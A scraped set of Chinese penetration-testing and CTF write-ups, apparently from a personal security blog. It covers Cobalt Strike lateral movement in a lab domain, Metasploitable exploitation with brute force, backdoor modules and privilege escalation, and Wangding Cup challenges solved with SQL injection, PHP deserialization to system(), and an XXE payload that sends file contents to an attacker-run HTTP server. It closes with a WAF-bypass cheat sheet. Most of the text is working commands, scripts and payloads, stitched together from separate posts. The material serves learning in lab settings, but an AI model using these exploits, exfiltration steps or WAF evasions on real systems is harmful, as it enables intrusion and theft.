netsh advfirewall show allprofiles 连接成功，同时观察到桌面 (左上角) 上有 nmap 应用程序。 在 CS 中执行 shell ipconfig 从上图可看到服务器除了有和和攻击机同网段的 192.168.52.10/24 的外网 IP 以外，还有内网 IP192.168.52.143/24。 继续在 CS 中使用服务器自带的 nmap 扫描内网有哪些活跃主机：shell nmap -sn -PR -n 192.168.52.143/24。注意，此命令必须在 Administrator 用户的 beacon 控制台下执行，在 System 用户下无法执行，因为 System 用户无法正确读取到环境变量，除非使用命令的完整路径来执行，比如 shell &quot;C:\\Program Files (x86)\\Nmap\\nmap.exe&quot; -sn -PR -n 192.168.52.143/24: 1234567192.168.52.1192.168.52.141192.168.52.254192.168.52.2192.168.52.138192.168.52.10192.168.52.143 3.1.6 域成员身份确定由于前面已经确定 Win7 服务器所属域为 god, 因此另外两台活跃主机一定有一台是域控制器 DC, 使用 net view 命令 (注意不要加 shell 前缀，否则结果不完整) 探测域内主机： 1net view 从上图可看到 192.168.52.138 的主机名为 OWA(全称应该是 Outlook Web App)，为主域控制器 PDC (Primary Domain Controller),192.168.52.141 的主机名为 ROOT-TVI862UBEH, 和 Win7 服务器一样同属于 god 域的域成员。 命令执行完成后，CS 会自动将探测到的设备加入” 目标列表”(注意，图中的 198.18.*.* 为本地基准测试 IP，在这里无实际意义，不必在意): 3.1.7 域成员端口扫描在 CS 的 Administrator 用户的 beacon 控制台中依次执行以下两条命令来分别扫描 192.168.52.138 和 192.168.52.141 两台主机的端口状态： 12shell nmap -sS -sC -Pn -n -sV -p 1-65535 192.168.52.138 shell nmap -sS -sC -Pn -n -sV -p 1-65535 192.168.52.141 从上面两张图片中可以看出这两台主机都开放了 SMB 协议的 445 端口，那么接下来可以尝试使用 CS 内置的 psexec 工具获取目标的 system shell。 3.2 横向移动 创建一个 SMB 监听器，名字为 wxdx，Payload 为 Beacon SMB： METASPLOITABLE-1kali攻击机，inet 172.20.10.4 netmask 255.255.255.240 网段：172.20.10.0/28 METASPLOITABLE-1 靶机，addr:172.20.10.3Bcast:172.20.10.15Mask:255.255.255.240 1netdiscover -r 172.20.10.0/28 -i eth0 扫到IP nmap扫端口 12nmap 172.20.10.3nmap -v -T4 -p- -A -oN nmap.log 172.20.10.3 扫目录 1python3 dirsearch -u 172.20.10.3 到 1http://172.20.10.3/tikiwiki 看看 发现TikiWiki 1.9.5是存在RCE漏洞的 爆破FTP我们这里先尝试爆破一下ftp 1hydra -L /home/kali/Desktop/user.txt -P /home/kali/Desktop/pass.txt ftp://172.20.10.3 已经成功爆破出 4 组有效的 FTP 账号和密码，具体信息如下： 账号：postgres，密码：postgres 账号：user，密码：user 账号：service，密码：service 账号：msfadmin，密码：msfadmin 爆破SSH九头蛇不知道为什么爆不出来 1medusa -h 172.20.10.3 -U user.txt -P pass.txt -M ssh -n 22 -t 4 -v 4 1telnet 172.20.10.3 输入用户名密码也是成功拿下权限 端口渗透利用metasploit然后启动msf 1msfconsole 端口1：6637——-irc_3281_backdoor登录msf 1search irc 找到对应模块 1use exploit/unix/irc/unreal_ircd_3281_backdoor 进入对应模块 查看配置 show options 1show options 设置主机名 进行漏洞利用 exploit 利用，成功获取会话，root权限 123set rhost 172.20.10.3set LHOST 172.20.10.4set LPORT 4444 RHOST是靶机IPRPORT设置攻击目标主机端口号LHOST是攻击机IP 这里靶机的6687端口没有开放所以没有成功利用到开放了如下端口，然后上面那个nmap也能看得到开放了哪些端口如果利用到了是这样的 端口2：6200——-vsftpd_234_backdoor6200靶机也没开放，我们这里还是讲一下手法 利用metasploit找到利用模块 1search sftpd 切换模块 查看配置 12use exploit/unix/ftp/vsftpd_234_backdoorshow options 反弹会话，root权限 12345678910set RHOSTS 目标IPset RPORT 21 #vsftpd 默认端口为 21set payload cmd/unix/reverseset LHOST 攻击机IPset LPORT 4444exploit 1id # 若显示 uid=0(root)，则已获取 root 权限 查看系统信息，寻找提权漏洞 12cat /etc/os-release # 查看系统版本 uname -r # 查看内核版本 提权利用内核漏洞提权（示例：脏牛漏洞，适用于特定内核版本）在攻击机生成提权脚本（需对应目标架构，如 x86/x64） 1msfvenom -p linux/x86/exec CMD=&quot;/bin/sh&quot; -f elf &gt; dirtycow.elf 在目标会话中下载并执行（攻击机需开启 HTTP 服务，如 python3 -m http.server 80）： 1234# 目标 shell 中操作wget http://攻击机IP:80/dirtycow.elf # 下载提权程序chmod +x dirtycow.elf # 赋予执行权限./dirtycow.elf # 执行提权，成功后会获得 root shell 利用 SUID 程序提权查找具有 SUID 权限的危险程序（如 find、bash 等）： 1find / -perm -4000 2&gt;/dev/null # 列出所有 SUID 程序 # 若存在可利用程序，例如 find： find / -exec /bin/sh \\; -quit # 通过 find 执行 shell 获取 root vsftpd 2.3.4 后门的典型特征是触发后在目标 6200 端口开放 shell，Metasploit 模块会自动连接该端口并反弹会话。 端口3：1524——-ingrelock_backdoor利用telnet连接1524，直接返回root会话端口3、1524——-ingrelock_backdoor 利用telnet连接1524，直接返回root会话 端口4：1099——-distcc程序漏洞—-ingrelock利用metasploit 返回对话 端口5：139——-samba为3.0漏洞先用nmap进行详细扫描 1nmap -v -A -T4 192.168.195.133 metasploit有众多扫描模块，以适应不同的需要。在metasploit中同样可以使用nmap进行扫描。在命令行中直接键入指令即可。 Samba 利用metasploit 端口6、8180——-Apache Tomcat弱口令1234567891011121314在终端中输入命令“nmap 172.20.10.3”，对目标主机进行端口扫描，发现开放8180端口并且运行着ApacheTomcat/CoyoteJSP engine1.1。在终端中输入命令“msfconsole”，启动MSF终端。在终端下输入命令“search tomcat”, 搜索tomcat的相关工具和攻击载荷。在终端输入“use auxiliary/scanner/http/tomcat_mgr_login”， 启用漏洞利用模块, 提示符就会提示进入到该路径下。在终端下输入“set RHOSTS 172.20.10.3”,设置攻击目标主机IP。在终端下输入“set RPORT 8180”,设置攻击目标主机端口号.在终端下输入“exploit”, 实施攻击。获得用户名tomcat,密码tomcat。在终端下输入“use exploit/multi/http/tomcat_mgr_deploy”, 启用漏洞利用模块, 提示符就会提示进入到该路径下。在终端下输入“set RHOST 172.20.10.3”,设置攻击的目标主机IP。在终端下输入“set RPORT 8180”,设置攻击的目标主机端口号。在终端下输入“set username tomcat”,设置攻击时使用的登录账号tomcat。在终端下输入“set userpassword tomcat”,设置攻击时使用的密码tomcat。在终端下输入“exploit”,开始攻击，建立会话。在终端下输入“getuid”,查看获取的用户权限。 得到用户名密码分别为tomcat，tomcat 上面不成功 12set HttpUsername tomcatset HttpPassword tomcat 可能版本太老了，tomcat已经做出防护了 端口7、80——-PHP CGI参数注入执行漏洞 网站渗透前面不是dirsearch扫出来，phpinfo和tikiwi吗这里我们就对这两个域名进行操作 1![](https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635476602-85919f53-59fc-46d5-a201-15752a43b7e4.png)","link":"/2025/12/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/"},{"title":"","text":"信呼OA文件上传","link":"/2025/12/11/%E4%BF%A1%E5%91%BCOA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"title":"","text":"网鼎杯 2018–Fakebook 扫到目录robots.txt 访问/user.php.bak 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass UserInfo{ public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) { $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; } function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) { return 404; } curl_close($ch); return $output; } public function getBlogContents () { return $this-&gt;get($this-&gt;blog); } public function isValidBlog () { $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); }} 这里看到view.php路径 然后可以大致判断flag应该在 1/var/www/html/flag.php 这里发现sql注入 1?no=1 and 1=1 判断列数4列 1?no=1 order by 4--+ 回显位为2 1?no=-1 union/**/select 1,2,3,4--+ 查数据库为fakebook 1?no=-1 union/**/select 1,group_concat(schema_name),3,4 from information_schema.schemata--+ 得到以下数据库 fakebook,information_schema,mysql,performance_schema,test 爆表 1?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&quot;fakebook&quot;--+ 得到表名users 爆字段 1?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&quot;users&quot;--+ 得到字段是no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS 最后查数据 1?no=-1 union/**/select 1,concat(no,&quot;\\n&quot;,username,&quot;\\n&quot;,passwd,&quot;\\n&quot;,data),3,4 from users--+ 得到如下数据 11 admin c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:8:&quot;123.blog&quot;;} data字段为我们刚join注册的数据序列化的形式 注意到源代码是iframe格式前面的分析可知flag.php的路径，ssrf可以伪协议file://,把序列化字符串作为参数输入测试，将blog值改为百度的网址 1no=-1 union/**/select 1,2,3,'O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:22:&quot;https://www.baidu.com/&quot;;}' 这里我没成功，暂时不知道什么原因 这边由于原本的https://www.baodu.com/是22，所以构造payload时这边改成file:///var/www/html/flag.php要更改长度为29 1?no=-1 union/**/select 1,2,3,'O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}' 解码得到flag","link":"/2025/12/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018--Fakebook/"},{"title":"","text":"网鼎杯 2020 朱雀组–phpweb 这个先放御剑扫一下，没出货然后观察到它是一直刷新的，我们用bp抓一下包 这里看到请求传了一个func和pfunc猜测是function,p应该是payload（猜的） 1func=file_get_contents&amp;p=index.php 传过去得到如下代码 123456789101112131415161718192021222324252627282930&lt;?php $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); function gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) { return $result; } else {return &quot;&quot;;} } class Test { var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } } } $func = $_REQUEST[&quot;func&quot;]; $p = $_REQUEST[&quot;p&quot;]; if ($func != null) { $func = strtolower($func); if (!in_array($func,$disable_fun)) { echo gettime($func, $p); }else { die(&quot;Hacker...&quot;); } } ?&gt; 先禁用了一大堆函数得到源码以后才知道原来是call_user_func()函数，还是见得少了，大佬估计直接能看出来是这个函数，我还要靠猜。 1$disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); 这里那么多函数被禁了，主要还是禁了system比较难受，但是问题不大，毕竟没有禁file_get_contents、cat以及serialize。 这里serialize才是重点（敲黑板！），毕竟源码里给我们提供了一个Test类： 123456789class Test { var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } }} 然后简单明了构造payload: 1234567891011121314151617181920&lt;?php class Test { var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } } } $a = new Test(); // $a-&gt;p = 'ls ../../../'; ==&gt; O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:12:&quot;ls ../../../&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;} // $a -&gt; p = &quot;find / -name 'flag*'&quot;; ⇒ O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:20:&quot;find / -name 'flag*'&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;} $a -&gt; p = 'cat /tmp/flagoefiu4r93'; // ==&gt; O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;} $a -&gt; func = 'system'; echo (serialize($a)); ?&gt;","link":"/2025/12/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84--phpweb/"},{"title":"","text":"网鼎杯 2020 青龙组–AreUSerialz 题目给了源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?php include(&quot;flag.php&quot;); highlight_file(__FILE__); class FileHandler { protected $op; protected $filename; protected $content; function __construct() { $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); } public function process() { if($this-&gt;op == &quot;1&quot;) { $this-&gt;write(); } else if($this-&gt;op == &quot;2&quot;) { $res = $this-&gt;read(); $this-&gt;output($res); } else { $this-&gt;output(&quot;Bad Hacker!&quot;); } } private function write() { if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) { if(strlen((string)$this-&gt;content) &gt; 100) { $this-&gt;output(&quot;Too long!&quot;); die(); } $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); } else { $this-&gt;output(&quot;Failed!&quot;); } } private function read() { $res = &quot;&quot;; if(isset($this-&gt;filename)) { $res = file_get_contents($this-&gt;filename); } return $res; } private function output($s) { echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; } function __destruct() { if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); } } function is_valid($s) { for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true; } if(isset($_GET{'str'})) { $str = (string)$_GET['str']; if(is_valid($str)) { $obj = unserialize($str); } } 分析一下GET方式传入序列化的str字符串，str字符串中每一个字符的ASCII范围在32到125之间，然后对其反序列化在反序列化的过程中，调用__destruct析构方法 1234567function __destruct() { if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); } 如果op===&quot;2&quot; ，将其赋为”1”，同时content赋为空，进入process函数，需要注意到的地方是，这里op与”2”比较的时候是强类型比较 12345678910public function process() { if($this-&gt;op == &quot;1&quot;) { $this-&gt;write(); } else if($this-&gt;op == &quot;2&quot;) { $res = $this-&gt;read(); $this-&gt;output($res); } else { $this-&gt;output(&quot;Bad Hacker!&quot;); }} 进入process函数后，如果op==&quot;1&quot; 那么进入write函数，若op==&quot;2&quot; ,则进入write函数，否则输出报错，可以看出来这里op与字符串的比较变成了若比较类型==所以我们之哦呀哦令op==2 ,这里2是整数int.当op=2时,op===&quot;2&quot; 为flaseop==&quot;2&quot; 为true,接着进入read函数 1234567private function read() { $res = &quot;&quot;; if(isset($this-&gt;filename)) { $res = file_get_contents($this-&gt;filename); } return $res;} filename是我们可以控制的，接着使用file_get_contents函数读取文件，我们此处借助php://filter伪协议读取文件，获取到文件后使用output函数输出 1234private function output($s) { echo &quot;[Result]: &lt;br&gt;&quot;; echo $s;} 整个利用思路就很明显了，还有一个需要注意的地方是，filename,$content三个变量权限都是protected，而protected权限的变量在序列化的时会有%00*%00字符，%00字符的ASCII码为0，就无法通过上面的is_valid函数校验。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?php class FileHandler { protected $op=2; protected $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;; protected $content; function __construct() { $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; // $this-&gt;process(); } public function process() { if($this-&gt;op == &quot;1&quot;) { $this-&gt;write(); } else if($this-&gt;op == &quot;2&quot;) { $res = $this-&gt;read(); $this-&gt;output($res); } else { $this-&gt;output(&quot;Bad Hacker!&quot;); } } private function write() { if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) { if(strlen((string)$this-&gt;content) &gt; 100) { $this-&gt;output(&quot;Too long!&quot;); die(); } $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); } else { $this-&gt;output(&quot;Failed!&quot;); } } private function read() { $res = &quot;&quot;; if(isset($this-&gt;filename)) { $res = file_get_contents($this-&gt;filename); } return $res; } private function output($s) { echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; } function __destruct() { if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; // $this-&gt;process(); } } $A=new FileHandler(); $B=serialize($A); echo $B; 输出 在这里有几种绕过的方式，简单的一种是：php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可 即: 123public $op=2;public $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;public $content; 现在得到的结果就没有%00字符了 1O:11:&quot;FileHandler&quot;:3:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;} 得到payload 1http://82f3c803-c285-4d4c-846c-59d240b730e0.node3.buuoj.cn/?str=O:11:%22FileHandler%22:3:{s:2:%22op%22;i:2;s:8:%22filename%22;s:57:%22php://filter/read=convert.base64-encode/resource=flag.php%22;s:7:%22content%22;N;}","link":"/2025/12/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84--AreUSerialz/"},{"title":"","text":"网鼎杯2018–Unfinish 先登录看一下 随便注册一个 发现再登录成功后用户名会回显我们这里先扫一遍看一眼 发现是存在sql盲注的题目提示SQL，在注册页面测试无果，且发现输入框限制了特殊字符，要用BurpSuite提交payload。username=alice’ and left(database(),1)&gt;’a’# 发现被过滤了得到nono这里我们去fuzz测试一下发现information和逗号，盲注可能不太行了经过尝试，构造username=select database()，登录后显示用户名还是为select database()，说明后台代码可能把username用单引号引起来了，导致其无法显示。 10’+ascii(substr(database() from 1 for 1))+’0; 1email=test2%40qq.com&amp;username=0'%2B(select hex(hex(database())))%2B'0&amp;password=123456 HEX转bytes373736353632-》776562-》web 12345678910111213141516171819202122232425262728293031323334import requests import logging import re from time import sleep # LOG_FORMAT = &quot;%(lineno)d - %(asctime)s - %(levelname)s - %(message)s&quot; # logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT) def search(): flag = '' url = 'http://b52b0533-2f84-4c9b-bd73-e912ab23a59f.node3.buuoj.cn/' url1 = url+'register.php' url2 = url+'login.php' for i in range(100): sleep(0.3)#不加sleep就429了 #先初始化注册一个账号，不重复的用i，这个是注入语句&quot;0'+ascii(substr((select * from flag) from {} for 1))+'0;&quot;.format(i) data1 = {&quot;email&quot; : &quot;1234{}@123.com&quot;.format(i), &quot;username&quot; : &quot;0'+ascii(substr((select * from flag) from {} for 1))+'0;&quot;.format(i), &quot;password&quot; : &quot;123&quot;} #登录这个账号 data2 = {&quot;email&quot; : &quot;1234{}@123.com&quot;.format(i), &quot;password&quot; : &quot;123&quot;} #发送请求获得响应 r1 = requests.post(url1, data=data1) #发送请求获得响应 r2 = requests.post(url2, data=data2) #查找那个回显的地方 \\s*(\\d*)\\s* 匹配「前后带任意空白的数字」 res = re.search(r'&lt;span class=&quot;user-name&quot;&gt;\\s*(\\d*)\\s*&lt;/span&gt;',r2.text) #提取纯数字（过滤可能的空格） res1 = re.search(r'\\d+', res.group()) #拼接flag flag = flag+chr(int(res1.group())) print(flag) print(&quot;final:&quot;+flag) if __name__ == '__main__': search()","link":"/2025/12/11/%E7%BD%91%E9%BC%8E%E6%9D%AF2018--Unfinish/"},{"title":"","text":"网鼎杯 2020 青龙组–filejava 先上传随便一个文件，点下载抓包 看到?file 看到有一个路径，里面有WEB-INF，题目提示与java有关，那应该是web.xml文件泄露，尝试读取 Java Web目录结构 WEB-INF/web.xml：核心配置文件，映射Servlet类路径。WEB-INF/classes/：存放编译后的Java类文件。利用路径穿越（../../）可读取敏感文件。XXE漏洞原理 XML解析器未禁用外部实体时，可通过file://协议读取本地文件，或通过HTTP请求外带数据（Blind XXE）。Apache POI 3.10版本默认未禁用外部实体，导致漏洞。Excel文件结构 XLSX为ZIP压缩包，内含XML文件，修改[Content_Types].xml可注入恶意实体。漏洞利用链设计 文件上传 → 触发XXE → 外带数据 → 获取Flag。 1DownloadServlet?filename=../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml 1DownloadServlet?filename=../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/cn/abc/servlet/DownloadServlet.class 下载下来一个class文件反编译一下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124package cn.abc.servlet; import java.io.File; import java.io.FileInputStream; import java.io.IOException; import java.net.URLEncoder; import javax.servlet.ServletException; import javax.servlet.ServletOutputStream; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; /* loaded from: _.._.._.._.._.._.._.._.._usr_local_tomcat_webapps_ROOT_WEB-INF_classes_cn_abc_servlet_DownloadServlet.class */ public class DownloadServlet extends HttpServlet { private static final long serialVersionUID = 1; protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { doPost(request, response); } protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { String fileName = new String(request.getParameter(&quot;filename&quot;).getBytes(&quot;ISO8859-1&quot;), &quot;UTF-8&quot;); System.out.println(&quot;filename=&quot; + fileName); if (fileName != null &amp;&amp; fileName.toLowerCase().contains(&quot;flag&quot;)) { request.setAttribute(&quot;message&quot;, &quot;禁止读取&quot;); request.getRequestDispatcher(&quot;/message.jsp&quot;).forward(request, response); return; } String fileSaveRootPath = getServletContext().getRealPath(&quot;/WEB-INF/upload&quot;); String path = findFileSavePathByFileName(fileName, fileSaveRootPath); File file = new File(path + &quot;/&quot; + fileName); if (!file.exists()) { request.setAttribute(&quot;message&quot;, &quot;您要下载的资源已被删除!&quot;); request.getRequestDispatcher(&quot;/message.jsp&quot;).forward(request, response); return; } String realname = fileName.substring(fileName.indexOf(&quot;_&quot;) + 1); response.setHeader(&quot;content-disposition&quot;, &quot;attachment;filename=&quot; + URLEncoder.encode(realname, &quot;UTF-8&quot;)); FileInputStream in = new FileInputStream(path + &quot;/&quot; + fileName); ServletOutputStream out = response.getOutputStream(); byte[] buffer = new byte[1024]; while (true) { int len = in.read(buffer); if (len &gt; 0) { out.write(buffer, 0, len); } else { in.close(); out.close(); return; } } } public String findFileSavePathByFileName(String filename, String saveRootPath) { int hashCode = filename.hashCode(); int dir1 = hashCode &amp; 15; int dir2 = (hashCode &amp; 240) &gt;&gt; 4; String dir = saveRootPath + &quot;/&quot; + dir1 + &quot;/&quot; + dir2; File file = new File(dir); if (!file.exists()) { file.mkdirs(); } return dir; } } 1zip -r ./payload.xlsx ./excel-123456 1234python -m SimpleHTTPServer 4560netstat -tulnp | grep 4560kill pid evil.dtd 1&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM 'http://10.88.15.58:4560/%file;'&gt;&quot;&gt; 是服务器nc的端口 启动http服务在xlsx文件的 1234&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://10.88.15.58:4560/evil.dtd&quot;&gt;%remote;%int;%send;]&gt; 1234python -m SimpleHTTPServer 4560python -m http.server 4560","link":"/2025/12/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84--filejava/"},{"title":"waf绕过手法","text":"waf绕过拍了拍你-安全KER - 安全资讯平台 搭建雷池waf进行测试 在http协议层面对我们的数据包进行检测，如果发现了可能是带有攻击性的语句，就会进行拦截 大小写绕1unIoN Select 双写绕关键词过滤替换 1ununionion ==&gt; 去掉union ==&gt; union 编码绕12345678910URL编码：waf没识别，但后端自动解码URL编码UNICODE //JSON的Unicode转义，JSON 解析器（如 Java 的 Jackson、Python 的 `json` 模块、Go 的 `encoding/json`）十六进制编码其他后端会解析的编码 编码类型 示例（以or为例） 后端解析方式 Base64 编码 b3I= Python：base64.b64decode(&quot;b3I=&quot;).decode() ASCII 十六进制（\\x） \\x6f\\x72 Python/PHP 直接解析（如 Pythonb&quot;\\x6f\\x72&quot;.decode()） 双重 URL 编码 %256F%2572 后端多次解码（先解%25为%，再解%6F%72为or） 垃圾字符1234GET /foo?sqli=111...80万个1...111'+and+2*3=6+--+ HTTP/1.1User-Agent: Mozilla/5.0Host: HostAccept: */* WAF设置了过滤数据包长度，如果数据包过大直接不检测 123application/x-www-form-urlencoded; charset=ibm037multipart/form-data; charset=ibm037, boundary=blahmultipart/form-data; boundary=blah ; charset=ibm037 修改编码绕过，大部分waf识别的是UTF8编码检测 分块传输burp插件：https://github.com/c0ny1/chunked-coding-converter.git 在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。这时，post请求报文中的数据部分需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的，也不包括分块数据结尾的，且最后需要用0独占一行表示结束。 HTTP协议绕过HTTP 0.9HTTP 0.9协议只有GET方法，且没有HEADER信息等，WAF就可能认不出这种的请求包，于是达到绕过WAF的效果，在header添加payload 参数污染（HPP）简单来说，存在多个同名参数的情况下，可能存在逻辑层和WAF层对参数的取值不同，即可能逻辑层使用的第一个参数，而WAF层使用的第二个参数，我们只需要第二个参数正常，在第一个参数插入payload，这样组合起来就可以绕过WAF，如下数据包： 1234GET /foo?par=first&amp;par=last HTTP/1.1User-Agent: Mozilla/5.0Host: HostAccept: */* 部分中间件的处理方法： Web环境 参数获取函数 获取到的参数 PHP/Apache $_GET(“par”) last JSP/Tomcat Request.getParameter(“par”) first Perl(CGI)/Apache Param(“par”) first Python/Apache getvalue(“par”) [“first”,”last”] ASP.NET/IIS Request.QueryString(“par”) first,last Pipeline（keep-alive）http请求头部中有Connection这个字段，建立的tcp连接会根据此字段的值来判断是否断开，当发送的内容太大，超过一个http包容量，需要分多次发送时，值会变成keep-alive，即本次发起的http请求所建立的tcp连接不断开，直到所发送内容结束Connection为close为止 我们可以手动将此值置为keep-alive，然后在http请求报文中构造多个请求，将恶意代码隐藏在第n个请求中，从而绕过waf 记得把brupsuite自动更新Content-Length的勾去掉 123456789101112131415161718POST / HTTP/1.1Host: www.baidu.comUser-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateUpgrade-Insecure-Requests: 1Connection: Keep-AliveContent-Type: application/x-www-form-urlencodedContent-Length: 3a=1GET / HTTP/1.1Host: www.baidu.comUser-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36Accept: 